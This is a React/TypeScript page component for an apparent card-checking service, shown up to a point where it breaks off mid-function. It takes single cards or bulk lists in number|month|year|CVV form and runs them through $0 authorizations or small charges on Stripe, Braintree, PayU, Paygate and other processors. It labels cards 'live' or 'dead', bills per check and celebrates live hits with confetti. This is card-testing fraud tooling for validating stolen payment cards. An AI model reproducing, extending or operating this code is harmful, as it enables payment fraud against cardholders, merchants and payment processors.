import { useState, useEffect, useRef } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import confetti from "canvas-confetti";
import { useLiveCardSound } from "@/hooks/useLiveCardSound";
import { useVictorySound } from "@/hooks/useVictorySound";
import { useBackgroundProcessing } from "@/hooks/useBackgroundProcessing";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Progress } from "@/components/ui/progress";
import { CardBrandLogo } from "@/components/CardBrandLogo";
import { 
  CreditCard, 
  CheckCircle, 
  XCircle, 
  Clock, 
  Zap,
  Coins,
  Activity,
  Loader2,
  ShieldCheck,
  ShieldX,
  AlertTriangle,
  Layers,
  Copy,
  Download,
  Pause,
  Play,
  Square,
  Building2,
  Globe,
  ArrowLeft,
  ChevronRight,
  Sparkles,
  Wallet,
  Store,
  ShoppingBag,
  CircleDollarSign,
  History,
  Paperclip,
  type LucideIcon
} from "lucide-react";
import { format } from "date-fns";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";

// BIN Lookup utilities
interface BinInfo {
  brand: string;
  type: string;
  level: string;
  bank: string;
  country: string;
  countryCode: string;
  brandColor: string;
  isRealData?: boolean;
  isLoading?: boolean;
}

// Type for Gateway API response (used by all gateways)
interface GatewayApiResponse {
  status: "live" | "dead" | "unknown";
  apiStatus: string;
  apiMessage: string;
  apiTotal?: string;
  rawResponse: string;
  usedGateway?: string; // For combined gateway - which API returned the result
}

const defaultBinInfo: BinInfo = {
  brand: "Unknown",
  type: "Unknown",
  level: "Standard",
  bank: "Unknown Bank",
  country: "Unknown",
  countryCode: "XX",
  brandColor: "bg-gray-500",
  isRealData: false,
  isLoading: false,
};

// Quick local brand detection for immediate feedback
const detectCardBrandLocal = (cardNumber: string): { brand: string; brandColor: string } => {
  const digits = cardNumber.replace(/\s/g, '');
  
  // Visa - starts with 4
  if (/^4/.test(digits)) return { brand: "Visa", brandColor: "bg-blue-600" };
  // Mastercard - starts with 51-55 or 2221-2720
  if (/^5[1-5]/.test(digits) || /^2[2-7]/.test(digits)) return { brand: "Mastercard", brandColor: "bg-orange-600" };
  // American Express - starts with 34 or 37
  if (/^3[47]/.test(digits)) return { brand: "Amex", brandColor: "bg-green-600" };
  // UnionPay - starts with 62 or 81
  if (/^62/.test(digits) || /^81/.test(digits)) return { brand: "UnionPay", brandColor: "bg-red-700" };
  // Discover - starts with 6011, 644-649, 65, or 622126-622925
  if (/^6(?:011|5|4[4-9]|22)/.test(digits)) return { brand: "Discover", brandColor: "bg-orange-500" };
  // JCB - starts with 3528-3589
  if (/^35(?:2[89]|[3-8])/.test(digits)) return { brand: "JCB", brandColor: "bg-red-600" };
  // Diners Club - starts with 300-305, 36, 38
  if (/^3(?:0[0-5]|[68])/.test(digits)) return { brand: "Diners Club", brandColor: "bg-gray-700" };
  // RuPay - starts with 60, 65, 81, 82, 508
  if (/^(?:60|65|81|82|508)/.test(digits)) return { brand: "RuPay", brandColor: "bg-blue-800" };
  // Mir - starts with 2200-2204
  if (/^220[0-4]/.test(digits)) return { brand: "Mir", brandColor: "bg-green-700" };
  // Elo - starts with various ranges
  if (/^(?:4011|4312|4389|5041|5066|5067|509|627780|636368)/.test(digits)) return { brand: "Elo", brandColor: "bg-yellow-600" };
  // Maestro - starts with 50, 56-69
  if (/^(?:5[06-9]|6[0-9])/.test(digits)) return { brand: "Maestro", brandColor: "bg-blue-700" };
  
  return { brand: "Unknown", brandColor: "bg-gray-500" };
};

interface Gateway {
  id: string;
  name: string;
  code?: string;
  type: "auth" | "preauth" | "charge";
  status: "online" | "maintenance" | "offline" | "unavailable";
  cardTypes: string;
  speed: string;
  successRate: string;
  description: string;
  icon: LucideIcon;
  iconColor: string;
}

// Default gateway configurations (status will be overridden from database)
const defaultGateways: Gateway[] = [
  { 
    id: "stripe_auth",
    name: "YUNCHI AUTH 1",
    code: "St",
    type: "auth",
    status: "online", 
    cardTypes: "Visa/MC/UnionPay/Diners/Maestro",
    speed: "⚡ Blazing",
    successRate: "98%",
    description: "$0 Auth Check • CVC optional • No Amex/Discover/JCB",
    icon: Sparkles,
    iconColor: "text-purple-500"
  },
  { 
    id: "combined_auth",
    name: "YUNCHI AUTH 2",
    code: "St+B3",
    type: "auth",
    status: "online", 
    cardTypes: "Visa/MC/Amex/Discover",
    speed: "⚡⚡ Ultra",
    successRate: "99%",
    description: "$0 Auth Check • Parallel API (Stripe ↔ B3) • CVC optional",
    icon: Zap,
    iconColor: "text-indigo-500"
  },
  { 
    id: "braintree_auth",
    name: "YUNCHI AUTH 3",
    code: "B3",
    type: "auth",
    status: "online", 
    cardTypes: "Visa/MC/Discover",
    speed: "⚡ Blazing",
    successRate: "96%",
    description: "$0 Auth Check • CVC optional (auto-handled if missing/000)",
    icon: Wallet,
    iconColor: "text-blue-500"
  },
  {
    id: "clover_charge",
    name: "CLOVER CHARGE", 
    type: "charge",
    status: "online", 
    cardTypes: "Visa/MC",
    speed: "Medium",
    successRate: "95%",
    description: "$0.50 Charge Verification • CVC required",
    icon: Store,
    iconColor: "text-green-500"
  },
  { 
    id: "square_charge",
    name: "SQUARE CHARGE", 
    type: "charge",
    status: "online", 
    cardTypes: "Visa/MC/Amex",
    speed: "Fast",
    successRate: "94%",
    description: "$0.50 Charge Verification • CVC required",
    icon: CircleDollarSign,
    iconColor: "text-emerald-500"
  },
  { 
    id: "shopify_charge",
    name: "SHOPIFY CHARGE", 
    type: "charge",
    status: "online", 
    cardTypes: "Visa/MC/Amex/Discover",
    speed: "Medium",
    successRate: "93%",
    description: "$1.00 Charge Verification • CVC required",
    icon: ShoppingBag,
    iconColor: "text-lime-500"
  },
  { 
    id: "stripe_charge",
    name: "STRIPE CHARGE",
    code: "StC",
    type: "charge",
    status: "online", 
    cardTypes: "Visa/MC/Amex",
    speed: "Fast",
    successRate: "85%",
    description: "$8.00 Charge • CVC required",
    icon: Zap,
    iconColor: "text-violet-500"
  },
  { 
    id: "paygate_charge",
    name: "PAYGATE", 
    type: "charge",
    status: "online", 
    cardTypes: "Visa/MC/Amex",
    speed: "Medium",
    successRate: "40%",
    description: "$14.00 Charged • CVC required",
    icon: CreditCard,
    iconColor: "text-cyan-500"
  },
  { 
    id: "payu_charge",
    name: "PayU",
    code: "PayU",
    type: "charge",
    status: "online", 
    cardTypes: "Visa/MC/RuPay",
    speed: "⚡ Blazing",
    successRate: "85%",
    description: "₹1-₹500 Custom Charge • CVC required",
    icon: Zap,
    iconColor: "text-orange-500"
  },
];

// Credit costs: LIVE = 2 credits, DEAD = 1 credit, ERROR/UNKNOWN = 0 credits
const CREDIT_COST_LIVE = 2;
const CREDIT_COST_DEAD = 1;
const CREDIT_COST_ERROR = 0;

interface CheckResult {
  status: "live" | "dead" | "unknown";
  message: string;
  gateway: string;
  card?: string;
  displayCard?: string; // Card as entered by user (without auto-added CVC)
  apiResponse?: string; // Real API response message for PAYGATE
  usedApi?: string; // For combined gateway - which API (stripe/b3) returned the result
  rawResponse?: string; // Full raw API response for debugging
}

interface BulkResult extends CheckResult {
  cardMasked: string;
  fullCard: string;
  displayCard: string; // Card as entered by user (without auto-added CVC)
  brand: string;
  brandColor: string;
  apiResponse?: string; // Real API response message for PAYGATE
  usedApi?: string; // For combined gateway - which API (stripe/b3) returned the result
  rawResponse?: string; // Full raw API response for debugging
}

interface GatewayCheck {
  id: string;
  created_at: string;
  gateway: string;
  status: string;
  result: string | null;
  fullCard?: string;
  displayCard?: string; // Card as entered by user (without auto-added CVC)
}

const Gateways = () => {
  const [selectedGateway, setSelectedGateway] = useState<Gateway | null>(null);
  const [cardNumber, setCardNumber] = useState("");
  const [expMonth, setExpMonth] = useState("");
  const [expYear, setExpYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [payuAmount, setPayuAmount] = useState<number>(1); // PayU custom amount (default ₹1)
  const [checking, setChecking] = useState(false);
  const [result, setResult] = useState<CheckResult | null>(null);
  const [userCredits, setUserCredits] = useState<number>(0);
  const [userId, setUserId] = useState<string | null>(null);
  
  // Bulk checking state
  const [bulkInput, setBulkInput] = useState("");
  const [bulkResults, setBulkResults] = useState<BulkResult[]>([]);
  const [bulkChecking, setBulkChecking] = useState(false);
  const [bulkPaused, setBulkPaused] = useState(false);
  const [bulkProgress, setBulkProgress] = useState(0);
  const [bulkTotal, setBulkTotal] = useState(0);
  const [bulkCurrentIndex, setBulkCurrentIndex] = useState(0);
  const [bulkStartTime, setBulkStartTime] = useState<number | null>(null);
  const [bulkEstimatedTime, setBulkEstimatedTime] = useState<string>("");
  const [workerCount, setWorkerCount] = useState(5); // Default 5 workers (1-10 range)
  const [bulkResultFilter, setBulkResultFilter] = useState<"all" | "live" | "dead" | "unknown">("all"); // Filter for bulk results
  const bulkAbortRef = useRef(false);
  const bulkPauseRef = useRef(false);

  // Gateway history state
  const [gatewayHistory, setGatewayHistory] = useState<GatewayCheck[]>([]);
  const [loadingHistory, setLoadingHistory] = useState(false);
  const [liveIndicator, setLiveIndicator] = useState(false);

  // Dynamic gateways state - merged from default config + database status
  const [gateways, setGateways] = useState<Gateway[]>(defaultGateways);
  const [loadingGateways, setLoadingGateways] = useState(true);

  const onlineCount = gateways.filter(g => g.status === "online").length;
  
  // Live card sound hook with settings check
  const { playLiveSound } = useLiveCardSound();
  const { playVictorySound } = useVictorySound();
  const { startBackgroundMode, stopBackgroundMode } = useBackgroundProcessing();
  
  const playLiveSoundIfEnabled = () => {
    const savedPrefs = localStorage.getItem("notification-preferences");
    const prefs = savedPrefs ? JSON.parse(savedPrefs) : { live_card_sound: true };
    if (prefs.live_card_sound !== false) {
      playLiveSound();
    }
  };

  const playVictorySoundIfEnabled = (intensity: "small" | "medium" | "epic") => {
    const savedPrefs = localStorage.getItem("notification-preferences");
    const prefs = savedPrefs ? JSON.parse(savedPrefs) : { live_card_sound: true };
    if (prefs.live_card_sound !== false) {
      playVictorySound(intensity);
    }
  };

  // BIN lookup state
  const [binInfo, setBinInfo] = useState<BinInfo>(defaultBinInfo);
  const binLookupRef = useRef<string>("");

  // Debounced BIN lookup via API
  useEffect(() => {
    const digits = cardNumber.replace(/\s/g, '');
    
    // Show immediate local detection
    if (digits.length >= 4) {
      const localBrand = detectCardBrandLocal(cardNumber);
      setBinInfo(prev => ({
        ...prev,
        brand: localBrand.brand,
        brandColor: localBrand.brandColor,
        isLoading: digits.length >= 6,
      }));
    } else {
      setBinInfo(defaultBinInfo);
      return;
    }

    // Only call API when we have 6+ digits
    if (digits.length < 6) return;

    const bin = digits.slice(0, 8);
    if (binLookupRef.current === bin) return;

    const timeoutId = setTimeout(async () => {
      binLookupRef.current = bin;
      try {
        const { data, error } = await supabase.functions.invoke('bin-lookup', {
          body: { bin },
        });

        if (error) throw error;

        if (data && !data.error) {
          setBinInfo({
            ...data,
            isLoading: false,
          });
        }
      } catch (err) {
        console.error('BIN lookup error:', err);
        // Keep local detection on error
        const localBrand = detectCardBrandLocal(cardNumber);
        setBinInfo(prev => ({
          ...prev,
          brand: localBrand.brand,
          brandColor: localBrand.brandColor,
          isLoading: false,
          isRealData: false,
        }));
      }
    }, 300);

    return () => clearTimeout(timeoutId);
  }, [cardNumber]);

  // Always activate background mode to prevent browser throttling during checks
  useEffect(() => {
    startBackgroundMode();
    return () => stopBackgroundMode();
  }, [startBackgroundMode, stopBackgroundMode]);

  useEffect(() => {
    fetchUserCredits();
    fetchGatewayStatus();
  }, []);

  // Fetch gateway status from database and subscribe to real-time updates
  const fetchGatewayStatus = async () => {
    setLoadingGateways(true);
    try {
      const { data: statusData, error } = await supabase
        .from('gateway_status')
        .select('id, status');

      if (error) throw error;

      if (statusData && statusData.length > 0) {
        // Merge database status with default gateway config
        setGateways(defaultGateways.map(gateway => {
          const dbStatus = statusData.find(s => s.id === gateway.id);
          if (dbStatus) {
            // Map 'unavailable' to 'maintenance' for UI display
            const displayStatus = dbStatus.status === 'unavailable' ? 'maintenance' : dbStatus.status;
            return { ...gateway, status: displayStatus as Gateway['status'] };
          }
          return gateway;
        }));
      }
    } catch (err) {
      console.error('Failed to fetch gateway status:', err);
    } finally {
      setLoadingGateways(false);
    }
  };

  // Subscribe to real-time gateway status updates
  useEffect(() => {
    const channel = supabase
      .channel('gateway-status-updates')
      .on(
        'postgres_changes',
        {
          event: 'UPDATE',
          schema: 'public',
          table: 'gateway_status',
        },
        (payload) => {
          const updated = payload.new as { id: string; status: string };
          setGateways(prev => prev.map(gateway => {
            if (gateway.id === updated.id) {
              // Map 'unavailable' to 'maintenance' for UI display
              const displayStatus = updated.status === 'unavailable' ? 'maintenance' : updated.status;
              return { ...gateway, status: displayStatus as Gateway['status'] };
            }
            return gateway;
          }));
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  // Fetch gateway history when gateway is selected and subscribe to real-time updates
  useEffect(() => {
    if (selectedGateway && userId) {
      fetchGatewayHistory(selectedGateway.id);

      // Subscribe to real-time card check updates
      const channel = supabase
        .channel(`card-checks-${selectedGateway.id}`)
        .on(
          'postgres_changes',
          {
            event: 'INSERT',
            schema: 'public',
            table: 'card_checks',
            filter: `user_id=eq.${userId}`,
          },
          (payload) => {
            const newCheck = payload.new as { id: string; created_at: string; gateway: string; status: string; result: string };
            // Only add if it's for the current gateway
            if (newCheck.gateway === selectedGateway.id) {
              // Trigger live indicator pulse
              setLiveIndicator(true);
              setTimeout(() => setLiveIndicator(false), 2000);
              
              setGatewayHistory(prev => {
                // Avoid duplicates
                if (prev.some(c => c.id === newCheck.id)) return prev;
                // Add to front, keep max 20
                return [newCheck, ...prev].slice(0, 20);
              });
            }
          }
        )
        .subscribe();

      return () => {
        supabase.removeChannel(channel);
      };
    }
  }, [selectedGateway, userId]);

  const fetchGatewayHistory = async (gatewayId: string) => {
    if (!userId) return;
    
    setLoadingHistory(true);
    try {
      const { data, error } = await supabase
        .from('card_checks')
        .select('id, created_at, gateway, status, result, card_details')
        .eq('user_id', userId)
        .eq('gateway', gatewayId)
        .order('created_at', { ascending: false })
        .limit(20);

      if (error) throw error;
      // Map card_details to fullCard for display
      const mappedData = (data || []).map(item => ({
        ...item,
        fullCard: (item as any).card_details || undefined
      }));
      setGatewayHistory(mappedData);
    } catch (err) {
      console.error('Failed to fetch gateway history:', err);
      setGatewayHistory([]);
    } finally {
      setLoadingHistory(false);
    }
  };

  const fetchUserCredits = async () => {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return;

    setUserId(user.id);
    
    const { data: profile } = await supabase
      .from('profiles')
      .select('credits')
      .eq('user_id', user.id)
      .single();

    if (profile) {
      setUserCredits(profile.credits);
    }

    const channel = supabase
      .channel('gateway-credits')
      .on(
        'postgres_changes',
        {
          event: 'UPDATE',
          schema: 'public',
          table: 'profiles',
          filter: `user_id=eq.${user.id}`
        },
        (payload) => {
          setUserCredits((payload.new as any).credits);
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  };

  // Helper to check if a card brand is blocked for YUNCHI AUTH 1
  const isBlockedCardBrand = (cardNumber: string): { blocked: boolean; brand: string } => {
    const digits = cardNumber.replace(/\s/g, '');
    // American Express - starts with 34 or 37
    if (/^3[47]/.test(digits)) return { blocked: true, brand: "American Express" };
    // Discover - starts with 6011, 644-649, 65, or 622126-622925
    if (/^6(?:011|5|4[4-9]|22)/.test(digits)) return { blocked: true, brand: "Discover" };
    // JCB - starts with 3528-3589
    if (/^35(?:2[89]|[3-8])/.test(digits)) return { blocked: true, brand: "JCB" };
    return { blocked: false, brand: "" };
  };

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 16);
    return digits.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    
    // For YUNCHI AUTH 1, auto-clear blocked card brands (Amex, Discover, JCB)
    if (selectedGateway?.id === "stripe_auth") {
      const { blocked, brand } = isBlockedCardBrand(formatted);
      if (blocked) {
        toast.error(`${brand} cards are not supported on YUNCHI AUTH 1`);
        setCardNumber("");
        return;
      }
    }
    
    setCardNumber(formatted);
  };

  // Helper function to check if a card is expired
  const isCardExpired = (month: string, year: string): boolean => {
    const now = new Date();
    const currentYear = now.getFullYear() % 100; // Get last 2 digits (e.g., 2026 -> 26)
    const currentMonth = now.getMonth() + 1; // getMonth() is 0-indexed
    
    const cardYear = parseInt(year);
    const cardMonth = parseInt(month);
    
    // Card is expired if:
    // - Year is in the past, OR
    // - Year is current but month is in the past
    if (cardYear < currentYear) {
      return true;
    }
    if (cardYear === currentYear && cardMonth < currentMonth) {
      return true;
    }
    return false;
  };

  const validateCard = () => {
    const digits = cardNumber.replace(/\s/g, '');
    if (digits.length < 13 || digits.length > 16) {
      toast.error("Invalid card number length");
      return false;
    }
    
    // For YUNCHI AUTH 1, validate card brand
    if (selectedGateway?.id === "stripe_auth") {
      const { blocked, brand } = isBlockedCardBrand(cardNumber);
      if (blocked) {
        toast.error(`${brand} cards are not supported on YUNCHI AUTH 1`);
        return false;
      }
    }
    
    if (!expMonth || !expYear || parseInt(expMonth) < 1 || parseInt(expMonth) > 12) {
      toast.error("Invalid expiration date");
      return false;
    }
    // Check if card is expired
    if (isCardExpired(expMonth, expYear)) {
      toast.error("Card is expired");
      return false;
    }
    // Allow empty CVV for auth gateways (will use 000 internally)
    const isAuthGateway = selectedGateway?.type === "auth";
    if (!isAuthGateway && (cvv.length < 3 || cvv.length > 4)) {
      toast.error("Invalid CVV");
      return false;
    }
    if (cvv.length > 0 && (cvv.length < 3 || cvv.length > 4)) {
      toast.error("Invalid CVV");
      return false;
    }
    return true;
  };

  // Real API check for YunChi Auth gateway via edge function with retry - returns status AND API response
  const checkCardViaApi = async (cardNumber: string, month: string, year: string, cvv: string, maxRetries = 5): Promise<GatewayApiResponse> => {
    const cc = `${cardNumber}|${month}|${year}|${cvv}`;
    
    for (let attempt = 0; attempt <= maxRetries; attempt++) {
      try {
        console.log(`[STRIPE-AUTH] Checking card (attempt ${attempt + 1}/${maxRetries + 1}):`, cc);
        
        const { data, error } = await supabase.functions.invoke('stripe-auth-check', {
          body: { cc }
        });
        
        if (error) {
          console.error('[STRIPE-AUTH] Edge function error:', error);
          if (attempt < maxRetries) {
            await new Promise(r => setTimeout(r, 500 + attempt * 200));
            continue;
          }
          return {
            status: "unknown",
            apiStatus: "ERROR",
            apiMessage: error.message || "Edge function error",
            rawResponse: JSON.stringify(error)
          };
        }
        
        console.log('[STRIPE-AUTH] API response:', data);
        
        // Extract real API response data
        const apiStatus = data?.apiStatus || data?.status || 'UNKNOWN';
        const apiMessage = data?.apiMessage || data?.message || 'No message';
        const rawResponse = JSON.stringify(data);
        
        // Use computedStatus from edge function if available
        const computedStatus = data?.computedStatus;
        if (computedStatus === "live" || computedStatus === "dead") {
          return { status: computedStatus, apiStatus, apiMessage, rawResponse };
        }
        
        // Fallback: Check message for status indicators
        const message = (data?.message as string)?.toLowerCase() || '';
        
        // LIVE: "Payment method added successfully" OR "Card added successfully"
        if (message.includes("payment method added successfully") || message.includes("card added successfully")) {
          return { status: "live", apiStatus, apiMessage, rawResponse };
        } else if (message.includes("declined") || message.includes("insufficient funds") || message.includes("card was declined")) {
          return { status: "dead", apiStatus, apiMessage, rawResponse };
        } else if (message.includes("no such paymentmethod")) {
          // "No such PaymentMethod" error - ALWAYS retry with longer delay
          console.log(`[STRIPE-AUTH] PaymentMethod error - retrying (attempt ${attempt + 1}/${maxRetries + 1})`);
          if (attempt < maxRetries) {
            await new Promise(r => setTimeout(r, 1000 + attempt * 500));
            continue;
          }
          return { status: "unknown", apiStatus, apiMessage, rawResponse };
        } else if (message.includes("rate limit") || message.includes("timeout") || message.includes("try again")) {
          // Other retryable errors
          console.log(`[STRIPE-AUTH] Retryable error detected: ${message}`);
          if (attempt < maxRetries) {
            await new Promise(r => setTimeout(r, 800 + attempt * 300));
            continue;
          }
          return { status: "unknown", apiStatus, apiMessage, rawResponse };
        } else {
          // Any other response is treated as unknown (no retry)
          return { status: "unknown", apiStatus, apiMessage, rawResponse };
        }
      } catch (error) {
        console.error('[STRIPE-AUTH] API check error:', error);
        if (attempt < maxRetries) {
          await new Promise(r => setTimeout(r, 500 + attempt * 200));
          continue;
        }
        return {
          status: "unknown",
          apiStatus: "ERROR",
          apiMessage: error instanceof Error ? error.message : "Unknown error",
          rawResponse: String(error)
        };
      }
    }
    return {
      status: "unknown",
      apiStatus: "ERROR",
      apiMessage: "Max retries exceeded",
      rawResponse: "Max retries exceeded"
    };
  };

  // PAYGATE API check via edge function with retry - returns status AND API response directly
  const checkCardViaPaygate = async (cardNumber: string, month: string, year: string, cvv: string, maxRetries = 5): Promise<GatewayApiResponse> => {
    const cc = `${cardNumber}|${month}|${year}|${cvv}`;
    
    for (let attempt = 0; attempt <= maxRetries; attempt++) {
      try {
        console.log(`[PAYGATE] Checking card (attempt ${attempt + 1}/${maxRetries + 1}):`, cc);
        
        const { data, error } = await supabase.functions.invoke('paygate-check', {
          body: { cc }
        });
        
        if (error) {
          console.error('[PAYGATE] Edge function error:', error);
          if (attempt < maxRetries) {
            await new Promise(r => setTimeout(r, 500 + attempt * 200));
            continue;
          }
          return {
            status: "unknown",
            apiStatus: "ERROR",
            apiMessage: error.message || "Edge function error",
            rawResponse: JSON.stringify(error)
          };
        }
        
        console.log('[PAYGATE] API response:', data);
        
        // Extract real API response data from edge function
        const apiStatus = data?.apiStatus || data?.status || 'UNKNOWN';
        const apiMessage = data?.apiMessage || data?.responseMessage || data?.message || 'No message';
        const apiTotal = data?.apiTotal || null;
        const rawResponse = data?.rawResponse || JSON.stringify(data);
        
        // Use computedStatus from edge function
        const computedStatus = data?.computedStatus;
        if (computedStatus === "live" || computedStatus === "dead") {
          return { status: computedStatus, apiStatus, apiMessage, apiTotal, rawResponse };
        }
        
        // Fallback: Check status field directly
        const status = (data?.status as string)?.toUpperCase() || '';
        if (status === 'APPROVED' || status === 'SUCCESS' || status === 'CHARGED' || status === 'LIVE') {
          return { status: "live", apiStatus, apiMessage, apiTotal, rawResponse };
        }
        if (status === 'DECLINED' || status === 'DEAD' || status === 'FAILED') {
          return { status: "dead", apiStatus, apiMessage, apiTotal, rawResponse };
        }
        
        // Check message for decline indicators
        const message = (data?.message as string)?.toLowerCase() || '';
        if (message.includes('decline') || message.includes('declined') || 
            message.includes('insufficient') || message.includes('invalid') || 
            message.includes('expired')) {
          return { status: "dead", apiStatus, apiMessage, apiTotal, rawResponse };
        }
        if (message.includes('approved') || message.includes('success') || message.includes('charged')) {
          return { status: "live", apiStatus, apiMessage, apiTotal, rawResponse };
        }
        
        // Rate limit or timeout - retry
        if (message.includes("rate limit") || message.includes("timeout") || message.includes("try again")) {
          console.log(`[PAYGATE] Retryable error detected: ${message}`);
          if (attempt < maxRetries) {
            await new Promise(r => setTimeout(r, 800 + attempt * 300));
            continue;
          }
        }
        
        return { status: "unknown", apiStatus, apiMessage, apiTotal, rawResponse };
      } catch (error) {
        console.error('[PAYGATE] API check error:', error);
        if (attempt < maxRetries) {
          await new Promise(r => setTimeout(r, 500 + attempt * 200));
          continue;
        }
        return {
          status: "unknown",
          apiStatus: "ERROR",
          apiMessage: error instanceof Error ? error.message : "Unknown error",
          rawResponse: String(error)
        };
      }
    }
    return {
      status: "unknown",
      apiStatus: "ERROR",
      apiMessage: "Max retries exceeded",
      rawResponse: "Max retries exceeded"
    };
  };

  // PayU API check with custom amount via edge function with retry
  const checkCardViaPayU = async (cardNumber: string, month: string, year: string, cvv: string, amount: number = 1, maxRetries = 5): Promise<GatewayApiResponse> => {
    const cc = `${cardNumber}|${month}|${year}|${cvv}`;
    
    for (let attempt = 0; attempt <= maxRetries; attempt++) {
      try {
        console.log(`[PAYU] Checking card (attempt ${attempt + 1}/${maxRetries + 1}):`, cc, `Amount: ₹${amount}`);
        
        const { data, error } = await supabase.functions.invoke('payu-check', {
          body: { cc, amount }
        });
        
        if (error) {
          console.error('[PAYU] Edge function error:', error);
          if (attempt < maxRetries) {
            await new Promise(r => setTimeout(r, 500 + attempt * 200));
            continue;
          }
          return {
            status: "unknown",
            apiStatus: "ERROR",
            apiMessage: error.message || "Edge function error",
            rawResponse: JSON.stringify(error)
          };
        }
        
        console.log('[PAYU] API response:', data);
        
        // Extract real API response data
        const apiStatus = data?.apiStatus || data?.status || 'UNKNOWN';
        const apiMessage = data?.apiMessage || data?.message || 'No message';
        const apiTotal = `₹${amount}`;
        const rawResponse = data?.rawResponse || JSON.stringify(data);
        
        // Use status from edge function
        const status = data?.status;
        if (status === "live" || status === "dead") {
          return { status, apiStatus, apiMessage, apiTotal, rawResponse };
        }
        
        // Fallback: Check message for status indicators
        const message = (apiMessage as string)?.toLowerCase() || '';
        if (message.includes('success') || message.includes('approved') || message.includes('charged') || message.includes('payment successful')) {
          return { status: "live", apiStatus, apiMessage, apiTotal, rawResponse };
        }
        if (message.includes('decline') || message.includes('failed') || message.includes('invalid') || message.includes('expired') || message.includes('rejected')) {
          return { status: "dead", apiStatus, apiMessage, apiTotal, rawResponse };
        }
        
        // Rate limit or timeout - retry
        if (message.includes("rate limit") || message.includes("timeout") || message.includes("try again")) {
          console.log(`[PAYU] Retryable error detected: ${message}`);
          if (attempt < maxRetries) {
            await new Promise(r => setTimeout(r, 800 + attempt * 300));
            continue;
          }
        }
        
        return { status: "unknown", apiStatus, apiMessage, apiTotal, rawResponse };
      } catch (error) {
        console.error('[PAYU] API check error:', error);
        if (attempt < maxRetries) {
          await new Promise(r => setTimeout(r, 500 + attempt * 200));
          continue;
        }
        return {
          status: "unknown",
          apiStatus: "ERROR",
          apiMessage: error instanceof Error ? error.message : "Unknown error",
          rawResponse: String(error)
        };
      }
    }
    return {
      status: "unknown",
      apiStatus: "ERROR",
      apiMessage: "Max retries exceeded",
      rawResponse: "Max retries exceeded"
    };
  };

  // STRIPE CHARGE API check ($8) via edge function - simple single call
  // Stripe Charge $8 API check via edge function with retry
  const checkCardViaStripeCharge = async (cardNumber: string, month: string, year: string, cvv: string, maxRetries = 2): Promise<GatewayApiResponse> => {
    const cc = `${cardNumber}|${month}|${year}|${cvv}`;
    
    for (let attempt = 0; attempt <= maxRetries; attempt++) {
      try {
        console.log(`[STRIPE-CHARGE] Checking card (attempt ${attempt + 1}/${maxRetries + 1}):`, cc);
        
        const { data, error } = await supabase.functions.invoke('stripe-charge-check', {
          body: { cc }
        });
        
        if (error) {
          console.error('[STRIPE-CHARGE] Edge function error:', error);
          // Retry on connection errors
          if (attempt < maxRetries) {
            await new Promise(r => setTimeout(r, 1000 + attempt * 500));
            continue;
          }
          return {
            status: "unknown",
            apiStatus: "ERROR",
            apiMessage: error.message || "Edge function error",
            rawResponse: JSON.stringify(error)
          };
        }
        
        console.log('[STRIPE-CHARGE] Response:', data);
        
        // Extract response data
        const apiStatus = data?.apiStatus || data?.status || 'UNKNOWN';
        const apiMessage = data?.message || data?.apiMessage || 'No message';
        const apiTotal = data?.apiTotal || '$8.00';
        const rawResponse = JSON.stringify(data);
        
        // Use computedStatus from edge function directly
        const computedStatus = data?.computedStatus;
        if (computedStatus === "live" || computedStatus === "dead") {
          return { status: computedStatus, apiStatus, apiMessage, apiTotal, rawResponse };
        }
        
        // Timeout/retry messages - try again
        const message = (apiMessage as string)?.toLowerCase() || '';
        if (message.includes('timeout') || message.includes('try again') || message.includes('connection')) {
          if (attempt < maxRetries) {
            await new Promise(r => setTimeout(r, 1500 + attempt * 500));
            continue;
          }
        }
        
        // Fallback: return unknown status
        return { status: "unknown", apiStatus, apiMessage, apiTotal, rawResponse };
      } catch (error) {
        console.error('[STRIPE-CHARGE] Error:', error);
        if (attempt < maxRetries) {
          await new Promise(r => setTimeout(r, 1000 + attempt * 500));
          continue;
        }
        return {
          status: "unknown",
          apiStatus: "ERROR",
          apiMessage: error instanceof Error ? error.message : "Unknown error",
          rawResponse: String(error)
        };
      }
    }
    return {
      status: "unknown",
      apiStatus: "ERROR",
      apiMessage: "Max retries exceeded",
      rawResponse: "Max retries exceeded"
    };
  };

  // B3 API check (YUNCHI AUTH 3) via edge function with retry - returns status AND API response
  const checkCardViaB3 = async (cardNumber: string, month: string, year: string, cvv: string, maxRetries = 5): Promise<GatewayApiResponse> => {
    const cc = `${cardNumber}|${month}|${year}|${cvv}`;
    
    for (let attempt = 0; attempt <= maxRetries; attempt++) {
      try {
        console.log(`[B3-AUTH] Checking card (attempt ${attempt + 1}/${maxRetries + 1}):`, cc);
        
        const { data, error } = await supabase.functions.invoke('braintree-auth-check', {
          body: { cc }
        });
        
        if (error) {
          console.error('[B3-AUTH] Edge function error:', error);
          if (attempt < maxRetries) {
            await new Promise(r => setTimeout(r, 500 + attempt * 200));
            continue;
          }
          return {
            status: "unknown",
            apiStatus: "ERROR",
            apiMessage: error.message || "Edge function error",
            rawResponse: JSON.stringify(error)
          };
        }
        
        console.log('[B3-AUTH] API response:', data);
        
        // Extract real API response data
        const apiStatus = data?.apiStatus || data?.status || 'UNKNOWN';
        const apiMessage = data?.apiMessage || data?.message || 'No message';
        const rawResponse = JSON.stringify(data);
        
        // Use computedStatus from edge function if available
        const computedStatus = data?.computedStatus;
        if (computedStatus === "live" || computedStatus === "dead") {
          return { status: computedStatus, apiStatus, apiMessage, rawResponse };
        }
        
        // Fallback: Check message for status indicators
        const message = (data?.message as string)?.toLowerCase() || '';
        
        if (message.includes("approved") || message.includes("success") || message.includes("authorized")) {
          return { status: "live", apiStatus, apiMessage, rawResponse };
